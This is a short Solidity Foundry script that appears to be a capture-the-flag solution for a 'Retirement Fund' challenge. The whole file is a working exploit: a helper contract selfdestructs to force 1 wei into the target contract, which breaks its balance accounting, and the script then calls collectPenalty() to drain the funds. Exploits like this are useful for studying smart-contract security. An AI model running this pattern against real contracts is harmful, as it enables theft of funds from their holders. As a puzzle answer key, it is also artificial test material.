// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Script.sol";

contract RetirementFundSolution is Script {
    address private RETIREMENT_FUND_ADDRESS = vm.envAddress("ADDRESS");

    function setUp() public {}

    function run() public {
        vm.startBroadcast();
        new RetirementFundExploiter{value: 1}(RETIREMENT_FUND_ADDRESS);

        (bool success,) = RETIREMENT_FUND_ADDRESS.call(abi.encodeWithSignature("collectPenalty()"));
        vm.stopBroadcast();
        require(success, "call failed");
    }
}

contract RetirementFundExploiter {
    constructor(address _address) public payable {
        require(msg.value > 0);
        selfdestruct(payable(_address));
    }
}
